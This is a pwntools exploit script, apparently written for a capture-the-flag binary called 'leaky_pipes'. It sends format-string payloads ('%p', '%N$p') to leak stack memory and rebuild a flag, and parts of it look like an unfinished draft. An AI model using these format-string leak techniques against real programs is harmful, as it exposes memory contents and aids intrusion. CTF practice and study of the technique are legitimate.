#!/bin/python3
from pwn import *
import sys

binary = "./leaky_pipes"
elf = context.binary = ELF(binary, False)
context.terminal = ["terminator", "-x", "bash", "-c"]
context.log_level  = 'debug'
#libc = elf.libc
#rop = ROP(elf)

script = '''

'''


def start(*args, **kwargs):
    usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
    # [ip, port]
    REMOTE = []
    if args:
        arguments = list(args)
        arguments.insert(0, elf.path)
        return process(arguments)

    if not args and not kwargs:
        if len(sys.argv) > 1:
            if sys.argv[1] == 'gdb':
                return gdb.debug(elf.path, gdbscript=script)
            elif sys.argv[1] == 'remote':
                return remote(REMOTE[0], REMOTE[1])
            else:
                print("INVALID ARGUMENT")
                print(usage)
                sys.exit(0)
        else:
            return process(elf.path)








def main():
    p = "%p."*40
    
    position = 0 # to 38
    flag1 = " "
    arr = [0x656b6166, 0x616c665f, 0x67]
    for i in range(36, 39):
        io = start()
        io.recvuntil('>> ')
        
        payload = f"{p32(arr[position])}|%{i}$p"
        io.sendline(payload.encode('utf-8'))
        io.recvuntil('mine :p\n')
        #hex = int(io.recvline(), 16)
        #arr[position] = hex
        io.close()
        position = position + 1

    position = 0
    
    for i in range(36, 39):
        io = start()
        io.recvuntil('>> ')
        
        payload = f"{p32(arr[position])}"
        io.sendline(payload.encode('utf-8'))
        io.recvuntil('mine :p\n')
        flag1 = flag1 + io.recvline().decode('utf-8')
        io.close()
        position = position + 1    



    log.success(f"Flag : {flag1}")

    '''
    payload = p32(0x41424344)
    payload += b'|%6$p'

    '''
    
    


if __name__ == "__main__":
    main()

